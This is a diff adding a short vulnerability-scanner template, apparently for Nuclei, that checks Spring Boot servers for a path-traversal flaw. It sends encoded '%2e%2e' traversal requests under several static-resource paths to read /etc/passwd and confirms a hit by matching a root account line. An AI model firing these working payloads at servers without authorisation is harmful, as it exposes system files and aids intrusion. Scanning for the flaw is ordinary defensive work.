@@ -1,0 +1,22 @@
+id: spring-lfi-2024-38819
+
+info:
+  name: Spring boot path traversal 
+  author: omkar7505
+  severity: high
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/static/link/%2e%2e/etc/passwd'
+      - '{{BaseURL}}/images/link/%2e%2e/etc/passwd'
+      - '{{BaseURL}}/css/link/%2e%2e/etc/passwd'
+      - '{{BaseURL}}/js/link/%2e%2e/etc/passwd'
+      - '{{BaseURL}}/resources/link/%2e%2e/etc/passwd'
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+        part: body
